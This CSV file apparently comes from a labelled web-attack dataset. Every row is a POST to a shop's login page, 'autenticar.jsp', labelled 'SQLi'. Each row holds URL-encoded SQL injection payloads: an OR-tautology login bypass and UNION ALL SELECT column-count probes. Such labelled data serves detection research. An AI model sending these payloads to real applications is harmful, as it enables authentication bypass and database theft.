,id,method,path,query,label
2560,12560,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%22ZuGS%22%20LIKE%20%22ZuGS,SQLi
2561,12561,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%22vjyE%22%20LIKE%20%22vjyE,SQLi
2562,12562,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%22oRtR%22%20LIKE%20%22oRtR,SQLi
2563,12563,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%201049%2C%201049%2C%201049%2C%201049%2C%201049%2C%201049%2C%201049%2C%201049%2C%201049%2C%201049%2C%201049%2C%201049%2C%201049%2C%201049%2C%201049%2C%201049%2C%201049%2C%201049%2C%201049%2C%201049%2C%201049%2C%201049%2C%201049%2C%201049%2C%201049%2C%201049%2C%201049%2C%201049%2C%201049%2C%201049%2C%201049%23,SQLi
2564,12564,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%205546%2C%205546%2C%205546%2C%205546%2C%205546%2C%205546%2C%205546%2C%205546%2C%205546%2C%205546%2C%205546%2C%205546%2C%205546%2C%205546%2C%205546%2C%205546%2C%205546%2C%205546%2C%205546%2C%205546%2C%205546%2C%205546%2C%205546%2C%205546%2C%205546%2C%205546%2C%205546%2C%205546%2C%205546%2C%205546%2C%205546%2C%205546%23,SQLi
2565,12565,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%203534%2C%203534%2C%203534%2C%203534%2C%203534%2C%203534%2C%203534%2C%203534%2C%203534%2C%203534%2C%203534%2C%203534%2C%203534%2C%203534%2C%203534%2C%203534%2C%203534%2C%203534%2C%203534%2C%203534%2C%203534%2C%203534%2C%203534%2C%203534%2C%203534%2C%203534%2C%203534%2C%203534%2C%203534%2C%203534%2C%203534%2C%203534%2C%203534%23,SQLi
2566,12566,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%201583%2C%201583%2C%201583%2C%201583%2C%201583%2C%201583%2C%201583%2C%201583%2C%201583%2C%201583%2C%201583%2C%201583%2C%201583%2C%201583%2C%201583%2C%201583%2C%201583%2C%201583%2C%201583%2C%201583%2C%201583%2C%201583%2C%201583%2C%201583%2C%201583%2C%201583%2C%201583%2C%201583%2C%201583%2C%201583%2C%201583%2C%201583%2C%201583%2C%201583%23,SQLi
2567,12567,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%2C%203074%23,SQLi
2568,12568,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%2C%209468%23,SQLi
2569,12569,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%2C%206370%23,SQLi
2570,12570,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%2C%207276%23,SQLi
2571,12571,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%2C%208523%23,SQLi
2572,12572,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%2C%201546%23,SQLi
2573,12573,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%205581%2C%205581%2C%205581%2C%205581%2C%205581%2C%205581%2C%205581%2C%205581%2C%205581%2C%205581%2C%205581%2C%205581%2C%205581%2C%205581%2C%205581%2C%205581%2C%205581%2C%205581%2C%205581%2C%205581%2C%205581%2C%205581%2C%205581%2C%205581%2C%205581%2C%205581%2C%205581%2C%205581%2C%205581%2C%205581%2C%205581%23,SQLi
2574,12574,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%207879%2C%207879%2C%207879%2C%207879%2C%207879%2C%207879%2C%207879%2C%207879%2C%207879%2C%207879%2C%207879%2C%207879%2C%207879%2C%207879%2C%207879%2C%207879%2C%207879%2C%207879%2C%207879%2C%207879%2C%207879%2C%207879%2C%207879%2C%207879%2C%207879%2C%207879%2C%207879%2C%207879%2C%207879%2C%207879%2C%207879%2C%207879%23,SQLi
2575,12575,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%201850%2C%201850%2C%201850%2C%201850%2C%201850%2C%201850%2C%201850%2C%201850%2C%201850%2C%201850%2C%201850%2C%201850%2C%201850%2C%201850%2C%201850%2C%201850%2C%201850%2C%201850%2C%201850%2C%201850%2C%201850%2C%201850%2C%201850%2C%201850%2C%201850%2C%201850%2C%201850%2C%201850%2C%201850%2C%201850%2C%201850%2C%201850%2C%201850%23,SQLi
2576,12576,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%23,SQLi
2577,12577,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%2C%20340%23,SQLi
2578,12578,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%2C%20976%23,SQLi
2579,12579,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%2C%206871%23,SQLi
2580,12580,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%2C%207640%23,SQLi
2581,12581,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%2C%202947%23,SQLi
2582,12582,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%2C%207989%23,SQLi
2583,12583,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20UNION%20ALL%20SELECT%206277%2C%206277%2C%206277%2C%206277%2C%206277%2C%206277%2C%206277%2C%206277%2C%206277%2C%206277%2C%206277%2C%206277%2C%206277%2C%206277%2C%206277%2C%206277%2C%206277%2C%206277%2C%206277%2C%206277%2C%206277%2C%206277%2C%206277%2C%206277%2C%206277%2C%206277%2C%206277%2C%206277%2C%206277%2C%206277%2C%206277%23,SQLi
2584,12584,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20UNION%20ALL%20SELECT%207411%2C%207411%2C%207411%2C%207411%2C%207411%2C%207411%2C%207411%2C%207411%2C%207411%2C%207411%2C%207411%2C%207411%2C%207411%2C%207411%2C%207411%2C%207411%2C%207411%2C%207411%2C%207411%2C%207411%2C%207411%2C%207411%2C%207411%2C%207411%2C%207411%2C%207411%2C%207411%2C%207411%2C%207411%2C%207411%2C%207411%2C%207411%23,SQLi
2585,12585,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20UNION%20ALL%20SELECT%20972%2C%20972%2C%20972%2C%20972%2C%20972%2C%20972%2C%20972%2C%20972%2C%20972%2C%20972%2C%20972%2C%20972%2C%20972%2C%20972%2C%20972%2C%20972%2C%20972%2C%20972%2C%20972%2C%20972%2C%20972%2C%20972%2C%20972%2C%20972%2C%20972%2C%20972%2C%20972%2C%20972%2C%20972%2C%20972%2C%20972%2C%20972%2C%20972%23,SQLi
2586,12586,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20UNION%20ALL%20SELECT%202900%2C%202900%2C%202900%2C%202900%2C%202900%2C%202900%2C%202900%2C%202900%2C%202900%2C%202900%2C%202900%2C%202900%2C%202900%2C%202900%2C%202900%2C%202900%2C%202900%2C%202900%2C%202900%2C%202900%2C%202900%2C%202900%2C%202900%2C%202900%2C%202900%2C%202900%2C%202900%2C%202900%2C%202900%2C%202900%2C%202900%2C%202900%2C%202900%2C%202900%23,SQLi
2587,12587,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20UNION%20ALL%20SELECT%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%2C%203214%23,SQLi
2588,12588,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20UNION%20ALL%20SELECT%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%2C%205697%23,SQLi
2589,12589,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20UNION%20ALL%20SELECT%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%2C%203552%23,SQLi
2590,12590,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20UNION%20ALL%20SELECT%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%2C%203513%23,SQLi
2591,12591,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20UNION%20ALL%20SELECT%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%2C%20145%23,SQLi
2592,12592,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20UNION%20ALL%20SELECT%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%2C%206288%23,SQLi
2593,12593,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%206725%2C%206725%2C%206725%2C%206725%2C%206725%2C%206725%2C%206725%2C%206725%2C%206725%2C%206725%2C%206725%2C%206725%2C%206725%2C%206725%2C%206725%2C%206725%2C%206725%2C%206725%2C%206725%2C%206725%2C%206725%2C%206725%2C%206725%2C%206725%2C%206725%2C%206725%2C%206725%2C%206725%2C%206725%2C%206725%2C%206725%23,SQLi
2594,12594,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%207324%2C%207324%2C%207324%2C%207324%2C%207324%2C%207324%2C%207324%2C%207324%2C%207324%2C%207324%2C%207324%2C%207324%2C%207324%2C%207324%2C%207324%2C%207324%2C%207324%2C%207324%2C%207324%2C%207324%2C%207324%2C%207324%2C%207324%2C%207324%2C%207324%2C%207324%2C%207324%2C%207324%2C%207324%2C%207324%2C%207324%2C%207324%23,SQLi
2595,12595,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%209655%2C%209655%2C%209655%2C%209655%2C%209655%2C%209655%2C%209655%2C%209655%2C%209655%2C%209655%2C%209655%2C%209655%2C%209655%2C%209655%2C%209655%2C%209655%2C%209655%2C%209655%2C%209655%2C%209655%2C%209655%2C%209655%2C%209655%2C%209655%2C%209655%2C%209655%2C%209655%2C%209655%2C%209655%2C%209655%2C%209655%2C%209655%2C%209655%23,SQLi
2596,12596,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%203154%2C%203154%2C%203154%2C%203154%2C%203154%2C%203154%2C%203154%2C%203154%2C%203154%2C%203154%2C%203154%2C%203154%2C%203154%2C%203154%2C%203154%2C%203154%2C%203154%2C%203154%2C%203154%2C%203154%2C%203154%2C%203154%2C%203154%2C%203154%2C%203154%2C%203154%2C%203154%2C%203154%2C%203154%2C%203154%2C%203154%2C%203154%2C%203154%2C%203154%23,SQLi
2597,12597,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%2C%203504%23,SQLi
2598,12598,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%2C%202974%23,SQLi
2599,12599,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%2C%207776%23,SQLi
2600,12600,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%2C%204591%23,SQLi
2601,12601,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%23,SQLi
2602,12602,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%2C%206382%23,SQLi
2603,12603,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%203832%2C%203832%2C%203832%2C%203832%2C%203832%2C%203832%2C%203832%2C%203832%2C%203832%2C%203832%2C%203832%2C%203832%2C%203832%2C%203832%2C%203832%2C%203832%2C%203832%2C%203832%2C%203832%2C%203832%2C%203832%2C%203832%2C%203832%2C%203832%2C%203832%2C%203832%2C%203832%2C%203832%2C%203832%2C%203832%2C%203832%23%20AND%20%286898%3D6898,SQLi
